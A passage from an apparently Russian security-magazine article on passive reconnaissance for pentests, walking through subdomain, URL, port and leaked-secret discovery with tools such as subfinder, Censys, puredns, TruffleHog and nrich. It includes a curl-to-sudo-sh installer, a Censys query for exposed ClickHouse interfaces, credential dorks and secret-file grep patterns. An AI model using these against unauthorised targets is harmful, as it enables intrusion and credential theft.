никакого отношения к исследуемой цели, и их необходимо будет проверить
вручную.
   Если мы нашли много мусора, не относящегося к нашей цели, то просто
отсортируем полученные результаты:


cat subdomain_ptr_all.txt | inscope | anew subdomain_ptr.txt

Файл subdomain_ptr_all.txt потом просто удаляем.


TLSx — поиск по сертификатам (взаимодействие)
Эта утилитка позволяет искать по всем подсетям домены в сертификатах.
Найтись они могут в полях CN и SAN.
   Пример команды для запуска:


echo "111.111.111.0/24" | tlsx -p 443,3443,8443,9443,10443 -cn -san
| anew tlsx

Вывод только уникальных доменов:


cat subnet | tlsx -p 443,3443,8443,9443,10443 -cn -san | grep -oP
'\[\K[^\]]+' | anew subdomain_tlsx_all.txt

Далее из списка полученных поддоменов достанем только домены второго
уровня и добавим уникальные значения в файл с доменами:


cat subdomain_tlsx_all.txt | rev | cut -d . -f 1,2 | rev | sort


             INFO

                           Аналогичная ситуация и с dnsx, там делаем все то
                    же самое.



Amass
Знаю, что на самом деле это очень крутая тулза, но исторически так сло‐
жилось, что лично мне она не очень понравилась, поэтому я использую ее
лишь для базовой проверки.
   Пример использования:


amass intel -asn 11111 | inscope | anew subdomain_amass.txt




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИCOVERSTORY

       PASSIVE RECON
       СОСТАВЛЯЕМ ПОЛНЫЙ ВОРКФЛОУ
                ДЛЯ ТИХОЙ РАЗВЕДКИ





Revwhoix
Как работает Whois? Мы подаем на вход домен и получаем в ответ информа‐
цию о нем. Однако утилита revwhoix позволяет делать обратное — например,
искать домены по имени организации.
  Нас интересуют все домены в базе данных Whois, у которых поле org соот‐
ветствует LLC "Roga and Kopyta" . Для начала получим доступ к бесплат‐
ному API, зарегистрировавшись на main.whoisxmlapi.com . Затем создаем
новый файл и просто кладем туда наш ключ: ~/.config/whoisxml.conf .
   Пример использования:


revwhoix -k "LLC "Roga and Kopyta"" | anew subdomain_revwhoix.txt


Haktrails
Один   из   многих   крутых   сервисов   для   сбора   поддоменов —
это securitytrails.com , думаю, он знаком почти всем. Мы можем восполь‐
зоваться документацией и затем сформировать запрос.
   Пример запроса:


curl --request GET --url 'https://api.securitytrails.com/v1/domain/
example.com/subdomains?children_only=false&include_inactive=true'
--header 'accept: application/json' -H 'apikey: you_api'

Ответ будет примерно такой:


{
  "endpoint": "/v1/domain/example.com/subdomains",
  "meta": {
    "limit_reached": false
  },
  "subdomain_count": 113,
  "subdomains": [
    "sport2",
    "race-banner-widget",
    "green-mobileappv2",
    "raffle",
    "blue-mobileappv2",
    "site-static-blue-cdn",

На мой взгляд, сложновато. Есть классная утилита haktrails , которая позволя‐
ет делать все то же самое, но без лишних сложностей.
   Команда для установки:


go install -v github.com/hakluke/haktrails@latest

Создаем папку для файла с настройками:


mkdir ~/.config/haktools/

Создаем сам конфиг:


nano ~/.config/haktools/haktrails-config.yml

Пример настроек:


securitytrails:
  key: you_api_ley

Пример команды для запуска:


cat scope | haktrails subdomains | anew subdomain_haktrails.txt


Subfinder
Это одна из лучших утилит для поиска доменов. Настоятельно рекомендую
использовать  API-ключи для  улучшения  результатов —  разница  просто
огромна.
   Команда для установки:


go install -v github.com/projectdiscovery/subfinder/v2/cmd/
subfinder@latest

Конфиг по умолчанию лежит по  пути ~/.config/subfinder/provider-
config.yaml .
   Вот как запустить поиск поддоменов по всему скоупу со статистикой
и всеми источниками:


subfinder -dL scope -all -stats | anew subdomain_subfinder.txt


Crt.sh
Еще один знаменитый ресурс для сбора поддоменов — crt.sh .
   Команда для поиска:


while IFS= read -r domain; do curl -s "https://crt.sh/?cn=%25.$domain
&output=json" | jq -r '.[].name_value' | sort -u | anew subdomain_
crtsh.txt; done < scope


Поддомены на GitHub
Один из этапов, о котором, наверное, все знают, но который большинство
специалистов пропускает, — сбор поддоменов с GitHub. Для этого существу‐
ет замечательная утилита github-subdomains . Для работы с ней я рекомендую
сгенерировать 4–5 API-ключей GitHub и добавить их согласно инструкции.
   Команда для установки:


go install github.com/gwen001/github-subdomains@latest

Простая команда для запуска выглядит так:


github-subdomains -d example.com -t ~/.config/github_recon/.tokens -o
"github_example_com.txt"

Команда для поиска поддоменов по доменам из файла scope :


while read -r domain; do github-subdomains -d "$domain" -t ~/.config/
github_recon/.tokens -o "github_${domain}.txt"; done < scope

Объединяем все в один файлик:


cat github_* | anew subdomain_github.txt


VirusTotal
Думаю, многие знают о том, что через этот замечательный старинный сервис
можно искать доменные имена и IP-адреса. Неплохо бы этот шаг делать
в самом  конце  поиска  поддоменов, но  у  VirusTotal  есть  ограничение
при использовании бесплатного API.





Комфортными  лимитами  нас,  конечно,  не  балуют:  один  запрос  раз
в 15 секунд с ограничением на 500 запросов в день и 15 500 в месяц.



Тут нужно действовать по ситуации. Иногда у нас уже может быть сфор‐
мирован список IP-адресов, а списка с поддоменами может еще не быть.
В таком сценарии мы будем искать по IP-адресам.
  В других случаях может быть так, что у нас еще не будет готового списка IP,
и тогда придется либо просто искать по доменам второго уровня, либо фор‐
мировать неполный список поддоменов и проходиться по нему.
   Особое внимание обрати на лимиты использования API: 500 запросов
в день — это очень мало для большого проекта.


Пример команды для поиска доменных имен по списку IP-адресов:


while read -r ip_list; do vt ip resolutions "$ip" -i host_name | awk
-F'"' '/host_name/ {print $2}'; sleep 15; done < ips.txt | anew
subdomain_virustotal.txt

Пример команды для поиска IP-адресов по доменным именам:


while read -r domain; do vt domain resolutions "$domain" -i ip_
address | awk -F'"' '/ip_address/ {print $2}'; sleep 15; done <
subdomains.txt | anew ip_list.txt


Censys
Часто этот замечательный сервис недооценивают или не используют весь его
потенциал. Здесь я приведу лишь несколько примеров по поиску информа‐
ции.


             INFO

                        Подробнее о Censys читай в статье « Что умеет
                       Censys? Ищем уязвимости, ключи и сертификаты
                     новым поисковиком ».


По моим наблюдениям, альтернатив по количеству, качеству и актуальности
найденной информации у Censys просто нет, поэтому мой выбор пал именно
на него, а не на знаменитый Shodan. Впрочем, чем больше у тебя инструмен‐
тов, тем лучше, так что пренебрегать аналогами тоже не стоит.
   Запрос ниже — более‑менее  универсальный и  позволяет соблюсти
золотую середину между валидностью предоставленных данных (результаты
в скоупе) и количеством предоставляемой информации.
   Итак, запрос:


(services.tls.certificate.parsed.subject.common_name="*.domain.ru"
or name="*.domain.ru" or services.tls.certificates.leaf_data.issuer.
common_name="*.domain.ru" or services.tls.certificates.leaf_data.
subject.common_name="*.domain.ru" or services.http.response.html_
title: "*.domain.ru" or services.http.response.html_tags="*.domain.
ru") or services.http.response.favicons.md5_hash:your-md5-hash and
not labels: truncated

Давай разберем его по частям. Следующая строка ищет сертификаты TLS,
в которых поле subject.common_name (основное имя субъекта сертификата)
соответствует домену *.domain.ru :


services.tls.certificate.parsed.subject.common_name="*.domain.ru"

Поиск записей, где имя ресурса соответствует *.domain.ru :


name="*.domain.ru"

Сертификаты,  выданные  организацией,  у  которой  в  поле  issuer.
common_name указано *.domain.ru :


services.tls.certificates.leaf_data.issuer.common_name="*.domain.ru"

Сертификаты TLS, в которых поле subject.common_name совпадает с *.
domain.ru :


services.tls.certificates.leaf_data.subject.common_name="*.domain.ru"

HTTP-ресурсы, в которых заголовок страницы  ( HTML  Title ) содержит *.
domain.ru :


services.http.response.html_title: "*.domain.ru"

Ресурсы, где *.domain.ru упоминается в HTML-тегах:


services.http.response.html_tags="*.domain.ru"

Следующая строка дополняет поиск ресурсами, у которых favicon (иконка
сайта) имеет MD5-хеш your-md5-hash . Этот фильтр может быть полезен
для идентификации похожих страниц:


services.http.response.favicons.md5_hash:your-md5-hash


Пара слов о favicon
Перед тем как перейти к краткому разбору запросов Censys, я хотел бы ска‐
зать пару слов о favicon. Favicon — это самая обыкновенная картинка,
которую браузер отображает на вкладках. Если, например, зайти на сайт
https://xakep.ru, то на открытой вкладке мы увидим логотип «Хакера».
   Хеши favicon удобно сравнивать при помощи сервиса favihash.com .





Саму картинку можно искать при помощи Dev Tools браузера — просто поис‐
ком по коду. Теперь, когда мы знаем хеш, пора двигаться дальше.


Мы  также можем исключить записи, которые помечены как truncated.
Это помогает избежать анализа недостоверных данных:


not labels: truncated

Иногда этот универсальный запрос не дает нам ничего или содержит лишние
результаты. Мы всегда можем воспользоваться оператором and not.
   Например, чтобы исключить из выдачи хосты определенных облачных пос‐
тавщиков, можно использовать следующую конструкцию:


and not autonomous_system.name=YANDEXCLOUD

А если мы в выдаче увидели, например, что‑то вроде domain-domain.ru , то
можем исключить подобное из выдачи следующим способом:


and not dns.names: "*-domain.ru"

Рекомендую подробнее  ознакомиться с  синтаксисом  запросов Censys,
при грамотном использовании этот сервис будет ценнейшим инструментом.
   Также для работы с Censys можно и нужно писать свою автоматизацию,
которая позволит получать информацию в терминале и использовать ее
в других сценариях, а не только смотреть в браузере. При большом скоупе
работать через браузер крайне неудобно, но готовых скриптов я пока
не нашел.


Пример применения Censys
Чтобы не быть голословным, приведу прикольный пример, который, воз‐
можно, тебя вдохновит.
   Разберем такой запрос:


 location.country=`Russia` and (services.port=`8123` and services.
 http.response.status_code=200)


Он ищет все хосты на территории РФ, у которых порт 8123 отвечает ста‐
тусом 200.
  На этом порте работает БД ClickHouse, вернее, HTTP-интерфейс. Далее
в пути дописываем /play и любуемся результатами.





Кстати, именно таким способом недавно был «взломан» китайский ИИ
DeepSeek .



ПЕРЕБИРАЕМ ПОДДОМЕНЫ

Еще один из этапов, которым пренебрегают некоторые специалисты, —
это брутфорс поддоменов. Процедура небыстрая и требующая определен‐
ной подготовки. Лучше всего выделить под это VPS, так как домашний роутер
точно не вывезет. Подойдет не любой хостер, но могу точно сказать, что
с DigitalOcean у меня проблем не было. Поднять виртуалку на пару часов
обычно недорого.
   Поскольку утилита Puredns , которую мы будем использовать, работает
поверх MassDNS, нам нужно на нашей VPS сначала заиметь себе MassDNS:


git clone https://github.com/blechschmidt/massdns.git
cd massdns
make
sudo make install

Затем установим Go:


wget https://go.dev/dl/go1.23.1.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.23.1.linux-amd64.
tar.gz
export PATH=$PATH:/usr/local/go/bin
go version

Переходим к самой Puredns.
   Команда для установки:


go install github.com/d3mondev/puredns/v2@latest

Словарь для брута:


wget https://wordlists-cdn.assetnote.io/data/manual/best-dns-
wordlist.txt

Список для резолверов:


wget https://public-dns.info/nameservers-all.txt

Пример команды для запуска перебора:


puredns bruteforce best-dns-wordlist.txt -d scope.txt -w subdomains.
txt -r nameservers-all.txt


Ограничиваем лимиты
Если видим, что VPS не вывозит нагрузку, то, как вариант, можно установить
лимиты по числу запросов:
 • для публичных DNS-серверов ставь --rate-limit в районе 1000–
   2000 запросов в секунду. Ты можешь начать с нижней границы (1000)
   и постепенно увеличивать до 2000, если нет блокировок;
 • для  доверенных  DNS-серверов  ( --rate-limit-trusted ) — 500–
   1000 запросов в секунду. Поскольку доверенные серверы (например,
   Google DNS, Cloudflare) могут быть более чувствительны к массовым зап‐
   росам, тут лучше быть осторожным.

Также можно ограничить число потоков ( --threads). Если используешь боль‐
ше 100 потоков, это может привести к увеличению скорости, но также и к
потенциальным проблемам — перегрузке сети и DNS-рекурсоров. Я бы
рекомендовал оставить 100 потоков, а при необходимости снизить до 50–75,
чтобы уменьшить нагрузку на систему.


Перебираем пермутации
Перебор пермутаций поддоменов — еще одна из вещей, которые многие
специалисты скипают из‑за банальной человеческой лени. Разумеется, осуж‐
даем!
  В переборе нам поможет утилита alterx.
   Ставим ее на нашу VPS:


go install github.com/projectdiscovery/alterx/cmd/alterx@latest

Делаем перестановки для поиска новых поддоменов:


cat domains | alterx | dnsx -o alterx_resolved.txt

Далее мы детектим те, у которых есть wildcard (маска), то есть те, которые
отвечают, что поддомен валиден для любого значения.


puredns resolve alterx_resolved.txt

Затем нам нужно удалить все строки, которые содержат домены с маской:


cat alterx_resolved.txt | grep -Ev '(^|\.)image\.finance\.domain\.
ru$|(^|\.)links\.news\.domain\.ru$|(^|\.)links\.domain\.ru$|(^|\.)
image\.news\.domain\.ru$|(^|\.)image\.moderation\.domain\.ru$|(^|\.)
image\.supplier\.domain\.ru$' | anew subdomain_brute.txt

Заносим находки в наш файлик:


cat subdomain_brute.txt | anew domains

Сортируем:


sort -o domains domains

В конце вручную удаляем всякий мусор, который может быть найден случай‐
но.


Ответы по доменам (взаимодействие)
Чтобы  проверять,  как  откликаются  хосты на  поддоменах, я  использую
еще одну утилиту — ff . У ее автора очень много качественного софта. Кон‐
кретно  эта  тулза  позволяет  проксировать  трафик и  сохранять  ответы
от веб‑приложений.
  В данном случае мы будем сохранять ответы, чтобы затем иметь воз‐
можность их проанализировать и поискать в них что‑то интересное.


             INFO

                      Это еще один несколько спорный момент в моем
                          перечне пассивных работ: с одной стороны, вза‐
                          имодействие с таргетом присутствует, с другой —
                      оно минимально. По сути, мы обращаемся к каж‐
                     дому домену один раз, и это действие вряд ли
                           триггернет какие‑то системы защиты.


Команда для установки:


go install github.com/tomnomnom/fff@latest

Пример команды для запуска:


cat subdomains | fff -d 5 -S -o fff_res_subdomain

В ответах мы будем искать новые поддомены.
   Начнем с того, что вытащим из ответов все URL. Тут нужно быть пов‐
нимательнее и либо использовать утилиту inscope, либо потом вручную про‐
верить поддомены, которые могут быть вне области проведения работ. Я
советую делать вручную, поскольку иногда можно наткнуться на что‑то инте‐
ресное.
   Пример команды:


cat fff_res_subdomain/* / *.body | grep -oriahE "https?://[^"\'> ] + " |
inscope | anew url_fff_subdomain.txt

Далее из списка URL будем собирать поддомены вот такой командой:


cat url_fff_subdomain.txt | grep -oP 'https://\K[^/]+' | anew
subdomain_fff.txt

В качестве альтернативы мы могли бы использовать готовую утилиту unfurl ,
которая, по сути, будет делать то же самое. Но тут кому что больше нравится.


             INFO

                             Кстати,  unfurl  умеет выводить из тела  ответа
                          отдельно пути, параметры, значения или пары
                      параметр — значение. Иногда это может быть
                          полезно при анализе конкретного таргета .


Пример команды для сбора поддоменов:


cat fff_res_subdomain/* / *.body | unfurl --unique domains | inscope |
anew passive_urls


SAN — сертификаты альтернативного имени субъекта
(взаимодействие)
Сертификаты SSL/TLS — это не только основа для обеспечения защищен‐
ного соединения, но и ценный источник информации в процессе разведки.
С их помощью можно найти поддомены, которые указаны в поле Subject
Alternative Name (SAN), а также проверить конфигурацию SSL на целевых сер‐
верах.
   Почему именно SAN, а не CN?
 • SAN (Subject Alternative Names) — современное поле сертификата, где
   перечислены все домены и поддомены, для которых сертификат действи‐
   телен.
 • CN (Common Name) — устаревшее поле, которое использовалось в SSL-
   сертификатах для указания основного домена. Современные браузеры
   и TLS-стеки больше не полагаются только на него, если в сертификате
   указано поле SAN.

Дальше мы рассмотрим однострочник, позволяющий извлечь поддомены
из SSL/TLS-сертификатов доменов, указанных в списке. Результат сохраня‐
ется в файл для дальнейшего анализа.
   Команда следующая:


while read domain; do openssl s_client -connect "$domain:443" 2>&1 <
/dev/null | openssl x509 -noout -text | grep -i dns | sed -E 's/
DNS://g' | tr -d ' ' | anew subdomain_openssl.txt; done < subdomains

В файле subdomains поддомены должны быть без префиксов http://
и https:// .
   То же самое можно было бы сделать и с помощью утилиты tlsx, которую мы
разбирали ранее. Лично мне нравятся однострочники, так как в них лучше
видно, что происходит, в сравнении с запуском утилиты.
  Еще одна важная тонкость: когда мы использовали tlsx раньше, на вход
подавались IP-адреса, принадлежащие компании, а сейчас на входе список
поддоменов.


СОБИРАЕМ URL ПО ВСЕМ ХОСТАМ

На этом этапе самое время дополнить нашу коллекцию урлов информацией
из общедоступных архивов. Для этого мы будем использовать разные ути‐
литы, которые, хоть и очень похожи по логике работы и по результатам, все
же дают немного отличающуюся информацию. Поэтому мы будем исполь‐
зовать их все, тем более что это занимает совсем немного времени.


Katana
Katana — высокопроизводительный краулер для сбора URL и путей на сайтах.
   Стоит отметить, что в версии katana 1.1.1 была удалена возможность пас‐
сивного сбора URL-адресов из разных источников, поэтому такую  воз‐
можность выделили в отдельную утилиту URLFinder. Теперь можно либо
использовать ее, либо пользоваться katana версии 1.1.0.
   Пример работы:


cat subdomains | katana --passive | tee -a url_pas_katana


Gau
Gau (GetAllUrls) — утилита для получения исторических URL из сервисов архи‐
вации вроде Wayback Machine и Common Crawl.
   Запустить можно так:


cat subdomains | ~/go/bin/gau | anew url_pas_gau


Waybackurls
Это простая CLI-утилита для извлечения URL из архива Wayback Machine.
   Пример запуска:


cat subdomains | waybackurls | anew url_pas_wayback


Github-endpoints
Инструмент для поиска чувствительных API-эндпоинтов и URL в открытых
репозиториях GitHub.
   Выше мы уже разбирали подобную утилиту того же автора. Сейчас мы
будем использовать github-endpoints уже для поиска именно конечных точек:


go install github.com/gwen001/github-endpoints@latest

По каждому домену:


while read -r domains; do github-endpoints -d "$domain" -t ~/.config/
github_recon/.tokens -o "github_${domain}.txt"; done < subdomains


             INFO

                            Если в файле, который подаем на входе, присутс‐
                            твуют префиксы http или https , их необходимо
                            удалить.


Объединяем в один файл:


cat github_url/github_* | anew url_pas_github




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИCOVERSTORY
       PASSIVE RECON
       СОСТАВЛЯЕМ ПОЛНЫЙ ВОРКФЛОУ
                ДЛЯ ТИХОЙ РАЗВЕДКИ





Xurlfind3r
Xurlfind3r — еще один инструмент для сбора URL из публичных источников,
фокусируется на скорости и масштабируемости.
   Пример команды:


xurlfind3r -l subdomains --include-subdomains -o url_pas_xurlfinder


Формируем общий список
На этом этапе нам необходимо слить в один файл результаты работы всех
инструментов, собирающих URL. Это поможет в дальнейшем их анализи‐
ровать и обрабатывать.
   Пример команды для сбора всех результатов:


cat url_* | anew temp_passive_urls

Удалим все ненужные нам расширения (картинки, видео, звук):


cat temp_passive_urls | grep -vEi '\.(
png|jpg|jpeg|gif|mp3|mp4|bmp|ico|css|svg|woff|woff2|webp)(\?.*)?$' >
temp


Очищаем данные от невалидных
Утилита uro пройдется по твоему списку и выдаст только интересные URL,
отфильтровав дубли и все, что не является гиперссылкой.


cat temp | uro

Но лично мне она не очень понравилась. Я в свое время написал на Python
собственный скрипт, который выполняет ту же задачу. Код недлинный, поэто‐
му приведу его здесь целиком. Ты можешь пользоваться как есть или допол‐
нить своими фичами.


from pprint import pprint
from typing import TypeAlias
from urllib.parse import urlparse, ParseResult


def main():
    with open("temp", "r") as fp:
        lines = fp.readlines()


    lines: list[str] = list(map(lambda x: x.lower(), lines))


    def get_clean_query_params(query):
        query_params: list[str] = []
        for param in query:
            try:
                key, _ = param.split("=", 1)
            except ValueError as e:
                continue
            query_params.append(f"{key}=")
        return query_params


    uniq_urls = []
    url_set = set()


    for line in lines:
        url = line.strip()
        parse_result: ParseResult = urlparse(url)


        query_params_list = parse_result.query.split("&")


        clear_line = f"{parse_result.scheme}://{parse_result.netloc}"
        if parse_result.path != "":
            clear_line += parse_result.path
        if parse_result.query != "":
            clear_line += "?"
            clear_line += "&".join(get_clean_query_params(
query_params_list))


        if clear_line not in url_set:
            uniq_urls.append(url)
            url_set.add(clear_line)


    # Сохраняем результат в файл
    with open("uniq_passive_urls.txt", "w") as outfile:
        for url in uniq_urls:
            outfile.write(url + "\n")


    print(f"Сохранено {len(uniq_urls)} уникальных URL в файл '
uniq_passive_urls.txt'.")


if __name__ == "__main__":
    main()

Этот код читает файл с URL-адресами, и если у них одинаковая схема, про‐
токол, путь и набор параметров, а  отличаются они  только значениями
параметров, то такие URL будут признаваться дубликатами и удаляться.
   То есть останутся адреса, у которых есть хотя бы одно отличие в схеме,
протоколе, пути или наборе параметров.
  В итоге у нас появится файл uniq_passive_urls с уникальными URL-
адресами, собранными пассивно из разных источников.


Добавляем домены из URL, полученных в архивах
Вдруг найдем что‑то новое? Как правило, новый поддомен тут встречается
нечасто, но попробовать все же стоит.
  Про unfurl я уже рассказывал выше, так что просто повторю команды:


cat uniq_passive_urls | unfurl --unique domains | anew subdomains

Вариант простой команды:


cat uniq_passive_urls | grep -oP 'https://\K[^/]+' | anew subdomains_
passive_url.txt

Настала пора собрать единый список поддоменов, для этого воспользуемся
простой командой:


cat subdomain_* | anew subdomains


ОБРАБАТЫВАЕМ СПИСОК ПОДДОМЕНОВ И IP
(ВЗАИМОДЕЙСТВИЕ)

На этом этапе у нас уже должен получиться довольно внушительный список
поддоменов, и теперь нам нужно его обработать. Точнее, сделать  сле‐
дующее:
 • собрать живые адреса;
 • посмотреть в целом, что куда резолвится (опционально);
 • зарезолвить домены в IP-адреса и дополнить наш список ip_list ;
 • сформировать список потенциальных виртуальных хостов (опционально).


Ищем живые поддомены через публичные DNS
На этом этапе лучше всего использовать DNS (и утилиту dnsx), поскольку
в таком случае работа будет производиться пассивно через публичные DNS
без какого‑либо взаимодействия с инфраструктурой заказчика.
  В качестве альтернативы можно взять httpx, но он будет слать запросы
напрямую к таргету, поэтому в данном случае это не лучший выбор.
   Пример команды:


cat subdomains | dnsx -silent -nc -resp -a | tee dnsx_all.txt | awk
'{print $1}' | sort -u | inscope | anew live_subdomains.txt && awk '{
gsub(/\[A\]|\[CNAME\]|\[|\]/,"")} {print $NF}' dnsx_all.txt | sort -u
 | anew ip_list_resolved

Мы получаем четыре файла.


dnsx_all.txt
Его содержимое будет выглядеть примерно так:


1.example.com [CNAME] [a.example.com]
a.example.com [A] [1.1.2.2]
ab.example.com [A] [1.1.2.2]
222.example.com [A] [2.2.2.4]
333.example.com [A] [2.2.2.4]

Такой формат в рамках нашего пайплайна не особенно удобен, однако
дополнительная информация может пригодиться при анализе возможных
виртуальных хостов и для общего понимания инфраструктуры. С содержимым
этого файла можно будет в дальнейшем сверяться.


dnsx_live_subdomain.txt
Это файл с живыми поддоменами, которые резолвятся в IP-адреса через пуб‐
личные DNS.


ip_list
Здесь список IP-адресов — с ним все понятно. Единственное, что хочу
добавить: для его составления есть альтернатива в виде такой команды:


cat subdomains | while read domain; do dig +short "$domain" | anew
ip_list.txt; done

Однако я предпочитаю описанный выше вариант, так как он просто более
информативен.
   После того как мы все зарезолвили, будем готовить список для анализа
открытых портов:


cat live_subdomains.txt domains ip_list | anew for_passive_ports

Эти списки (домены, живые поддомены и IP-адреса) мы объединяем для того,
чтобы результаты сканирования были более полными. Тут нужно понимать,
что универсального решения нет: либо мы получаем неполное покрытие,
либо покрытие будет максимальным, но с некоторым количеством  дуб‐
ликатов. На мой взгляд, второй вариант предпочтительнее.


potential_vhost.txt
Можно еще поискать IP-адреса, в которые резолвятся разные домены.
Это может служить маркером наличия виртуальных хостов.


awk '{gsub(/\[A\]|\[|\]/,"")} {ips[$NF] = ips[$NF] ? ips[$NF] ", "
$1 : $1} END {for (ip in ips) if (split(ips[ip], arr, ", ") > 1)
print ip ": " ips[ip]}' dnsx_resolved_with_ip.txt | sort -u >
potential_vhost.txt


ПАССИВНО СМОТРИМ ОТКРЫТЫЕ ПОРТЫ

Если нам нужна полная тишина, то для сканирования портов нам подойдет
Smap .
   Команда для запуска:


smap -iL for_passive_ports -sV -oN smap

Как вариант можно использовать Naabu в пассивном режиме.


             INFO

                     Naabu сам по себе  сканирует  список целей
                      и выводит информацию в формате ip:port . Он
                           умеет работать в активном или в  пассивном
                      режиме, но учти, что если добавить флаг nmap-
                   cli, то запускаемый Nmap уже будет активни‐
                         чать независимо от того, какой режим выбран
                         у Naabu.


Лично я предпочитаю на проектах по пентесту использовать связку из Naabu
и Nmap, так как цели как‑то особенно спрятаться обычно нет, а дополнитель‐
ная информация будет очень полезна.
   Команда для запуска:


naabu -list for_passive_ports -passive -silent -verify -ec -nmap-cli
"nmap -sV -oA nmap-naabu-passive" -o naabu-passive.txt

Чтобы было удобнее просматривать результаты Nmap, можно сконверти‐
ровать XML в HTML с помощью утилитки xsltproc:


xsltproc nmap-naabu-passive.xml -o nmap-naabu-passive.html

В итоге получим довольно красивый и неплохо читаемый HTML-документ c
перечислением портов и работающих на них сервисов.


ПАССИВНЫЙ ПОИСК БАГОВ

Google Dorks (взаимодействие)
Помнишь, в самом начале у нас был файл urls_dorks.txt? Дорки, настало
ваше время!
  Ты можешь сказать, что, если мы начнем переходить по ссылкам, найден‐
ным с помощью дорков, это уже будет активным действием. Но мы будем
открывать  ссылки  в  браузере —  эти  одиночные  запросы  неотличимы
от поведения простого пользователя. Никакого фаззинга, который мог бы
спровоцировать реакцию защитных систем.
   Далеко не все дорки можно автоматизировать, некоторые куда полезнее
применять вручную.
   Вот, например, дорк для поиска документов (в них могут быть креды
и полезные ссылки, например для регистрации):


site:domain.ru (ext:pdf OR ext:doc OR ext:docx OR ext:zip OR ext:bak
OR ext:txt OR ext:ppt OR ext:pptx OR ext:xls OR ext:xlsx)


Секреты GitHub
Поиск секретов мы начнем с обнаружения репозиториев, принадлежащих
компании или, например, каким‑то сторонним разработчикам, имеющим
отношение к исследуемой цели. Поэтому в продолжение темы с Google Dorks
воспользуемся таким дорком:


site: "github.com" + "domain.ru" + password

Искать захардкоженную чувствительную информацию будем с помощью всем
известной утилиты TruffleHog .
   Существуют разные способы установки и использования TruffleHog, все
они описаны в документации. Я приведу примеры тех, которыми сам поль‐
зуюсь чаще всего.
   Команда для установки:


curl -sSfL https://raw.githubusercontent.com/trufflesecurity/
trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin

Пример команды для запуска по всем репозиториям:


sudo trufflehog github --org=name-org --results=verified,unknown

Здесь --org=name-org — имя организации (репозитория).





                            Пример ответа

Как видишь, мы узнали:
 • учетные данные;
 • внутренние адреса компании;
 • email-адреса сотрудников.


Leakix.net
У сервиса leakix.net есть довольно большой список бесплатных плагинов ,
с помощью которых можно неплохо протестировать наш скоуп. Также предос‐
тавляется API с ограничением на 3000 запросов в месяц.
   Вот так можно посмотреть утечки :


https://leakix.net/search?scope=leak&q=%2Bexample.com





А вот так — использовать сервис из командной строки, передав ему список
IP:


while IFS= read -r target; do target=$(echo "$target" | tr -d '\r');
curl -H 'api-key: api' -H 'accept: application/json' "https://leakix.
net/search?scope=leak&page=0&q=+$target" | anew $target .json ; sleep 2
; done < ../ip_list

Ответ уже парсим, как захотим.
   У сервиса качественная документация, поэтому советую ее изучить. Нап‐
ример, чтобы собрать не утечки, а просто известные активы, можно заменить
значения параметра scope и вместо leak запросить service .
   Однако сервис выдает маловато информации. Явно можно лучше!


Shodan и nrich
Помнишь, что у нас уже есть собранный список IP-адресов? Можем быс‐
тренько просмотреть их при помощи Shodan на предмет известных уязвимос‐
тей.
   Тут нам поможет инструмент командной строки nrich . Он позволяет ана‐
лизировать IP-адреса, перечисленные в файле, и выявлять те, где есть откры‐
тые порты, а на них работают уязвимые сервисы.


             INFO

                          Nrich также может получать данные из stdin —
                          удобно для использования в пайплайнах.


Скачиваем и устанавливаем nrich:


wget https://gitlab.com/api/v4/projects/33695681/packages/generic/
nrich/latest/nrich_latest_x86_64.deb
sudo dpkg -i nrich_latest_x86_64.deb

Запускаем:


nrich ip_list | anew nrich_res

В  качестве  аналога  можно  использовать  Lazy-Hunter  (пример  запуска
и результатов работы — по той же ссылке). По сути, он работает так же
и берет информацию из Shodan с помощью CVEDB API. Какая из утилит дает
более точные результаты, я не знаю и обычно запускаю обе.
  В целом все то же самое можно сделать и с помощью одной строчки
на Bash.


Работа с заголовками
Поскольку мы сохранили ответы при обращении к доменам, теперь можем
проанализировать заголовки, чтобы выявить используемое программное
обеспечение, возможные риски и мисконфигурации безопасности. Также
получим более детальное понимание инфраструктуры.
   Посмотреть, какие в целом есть заголовки, можно такой командой:


find fff_res/* / *.headers -type f | fzf --preview 'less {}'





Заголовки, комментарии, атрибуты
Еще одно интересное, на мой взгляд, решение для работы в терминале —
это утилита html-tool .
   Команда для установки:


go install github.com/tomnomnom/hacks/html-tool@latest

Данная тулза позволяет нам просматривать заголовки:


find fff_res/* / *.body -type f | html-tool tags title | sort | bat

Также можно смотреть комментарии:


find * / * / *.body -type f | html-tool comments | sort | uniq | bat





Атрибуты:


find * / * / *.body -type f | html-tool attribs src href | sort | bat


Программное обеспечение сервера
Поискать, какие технологии используются, можно такой командой:


find * / * / *.body -type f | grep -Hnr "\(Powered\|Server\)"





А вот команда для просмотра уникальных заголовков Server и Powered-by :


find fff_res -name "*.headers" -exec grep --color -Hr "\(Powered\|
Server:\)" {} + | awk -F : '{print $3}' | uniq





Если нужно посмотреть URL, где мы получили интересующие нас заголовки,
выполним команду ниже и в строке поиска поищем нужный заголовок:


fd . --threads 48 -t f -e headers -X grep --color -n "\(Powered\|
Server\)" {} | fzf --ansi --delimiter : --preview "batcat
--color=always --theme zenburn --highlight-line {2} --line-range={2}:
-25 --line-range={2}:+25 {1} | fold -s -w 200"





Собираем UUID
Поискать разные ID можно такой командой:


grep -Eo '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][
0-9a-fA-F]{3}-[0-9a-fA-F]{12}' live_passive_url | sort -u | anew
UUID.txt

Вдруг найдем IDOR!


Поиск конфиденциальной информации
Вытаскиваем все ссылки на файлы с данными, настройками, запросами
и прочими форматами, где может быть что‑то интересное:


grep -Eo 'https?://[^ ]+\.(
env|yaml|yml|json|xml|log|sql|ini|bak|conf|config|db|dbf|tar|gz|backu
p|swp|old|key|pem|crt|pfx|pdf|xlsx|xls|ppt|pptx)
' live_passive_url

Возможно, здесь можно что‑то автоматизировать, но я предпочитаю смот‐
реть результаты вручную.


ИТОГОВАЯ СТРУКТУРА ФАЙЛОВ И ДИРЕКТОРИЙ

Давай посмотрим, какая информация будет у нас в результате выполнения
всего воркфлоу.





Я выделил те файлы, которые могут быть нам полезны в дальнейшем.


ВЫВОДЫ

В этой статье мы рассмотрели этап пассивной разведки, который позволил
нам собрать ценную информацию о цели без прямого взаимодействия с сис‐
темой, минимизируя риск обнаружения.
  Мы получили доменные имена, IP-адреса, URL, электронные почты, а так‐
